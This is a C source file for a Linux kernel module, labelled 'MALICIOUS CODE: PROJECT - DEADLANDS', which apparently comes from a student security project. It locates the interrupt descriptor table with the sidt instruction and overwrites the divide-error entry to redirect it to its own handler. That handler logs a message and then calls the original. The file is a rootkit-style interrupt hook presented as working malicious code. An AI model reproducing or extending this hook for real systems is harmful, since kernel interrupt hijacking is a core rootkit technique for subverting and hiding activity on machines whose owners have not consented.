/*
** hookIDT.c for ** MALICIOUS CODE: PROJECT - DEADLANDS **
** 
** Made by majdi
** Login   <majdi.toumi@gmail.com>
** 
*/

#include <linux/module.h>
#include "hookIDT.h"

/*
** ~ Informations:
*/
MODULE_LICENSE("Dual BSD/GPL");
MODULE_AUTHOR("[ EpiTek4 ] Strasbourg");

/*
** ~ Initializations:
*/

unsigned long	ptr_idt_table;
unsigned long	pdt_gdt_table;
unsigned long	old_interrupt;



static int	hookIDT_init(void)
{
  printk(KERN_ALERT "[MSG] deadlands h00k IDT - module init\n");

  ptr_idt_table = get_idt_addr();
  epiHook(INT_0, &my_handler);
  printk(KERN_ALERT "[MSG] deadlands h00k SYS - interrupt powned!\n");
  return (0);
}

static void	hookIDT_exit(void)
{
  printk(KERN_ALERT "[MSG] deadlands h00k IDT - module exit\n");
  epiHook1(INT_0);
  printk(KERN_ALERT "[MSG] deadlands h00k IDT - interrupt restored!\n");
}

/*
** ~ Functions:
*/
unsigned long	get_idt_addr(void)
{
  unsigned char	idtr[6];
  unsigned long	idt;

  __asm__ volatile ("sidt %0" :  "=m" (idtr));
  idt = *((unsigned long *)&idtr[2]);
  return (idt);
}

int		epiHook(int nINT, void *new_interrupt)
{
  struct s_descriptorIDT	*idt;
  unsigned long			addr;

  addr = (unsigned long)new_interrupt;
  idt = (struct s_descriptorIDT *)ptr_idt_table;

  old_interrupt = (unsigned long)get_interrupt_from_idt(nINT);


  idt[nINT].offset_hi = (unsigned short)(addr >> 16);
  idt[nINT].offset_lo = (unsigned short)(addr & 0x0000FFFF);
  return (0);
}

int		epiHook1(int nINT)
{
  struct s_descriptorIDT	*idt;

  idt = (struct s_descriptorIDT *)ptr_idt_table;

  idt[nINT].offset_hi = (unsigned short)(old_interrupt >> 16);
  idt[nINT].offset_lo = (unsigned short)(old_interrupt & 0x0000FFFF);
  return (0);
}

void		*get_interrupt_from_idt(int nINT)
{
  struct s_descriptorIDT	*idt;
  void				*addr;

  idt = &((struct s_descriptorIDT *)ptr_idt_table)[nINT];
  addr = (void *)(((unsigned long)0xFFFFFFFF00000000) + (((unsigned long)idt->offset_hi) << 16) + ((unsigned long)(idt->offset_lo)));
  return (addr);
}

asmlinkage void my_handler(struct pt_regs * regs, long err_code)
{
  void (*old_int_handler)(struct pt_regs *, long) = (void *)old_interrupt;
  printk(KERN_ALERT "[MSG] deadlands h00k IDT - INTERCEPT IDT^^\n");

  (*old_int_handler)(regs, err_code);
}

module_init(hookIDT_init);
module_exit(hookIDT_exit);
